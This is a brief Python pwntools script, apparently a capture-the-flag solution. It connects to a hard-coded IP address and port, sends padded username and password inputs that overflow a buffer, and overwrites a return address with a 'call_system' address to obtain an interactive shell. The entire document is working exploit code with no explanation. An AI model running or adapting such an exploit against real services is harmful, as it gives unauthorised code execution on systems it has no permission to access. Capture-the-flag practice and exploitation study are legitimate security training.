from pwn import *
#nc 104.198.76.97 9001
call_system=0x400eb0
s=remote('104.198.76.97',9001)
s.recvuntil("please enter your username: ")
s.send('A'*(0x50-0x2))
s.recvuntil("please enter your password: ")
s.sendline("todo: ldap and kerberos support\x00"+'A'*(0x50-0x28)+p32(call_system))

s.interactive()
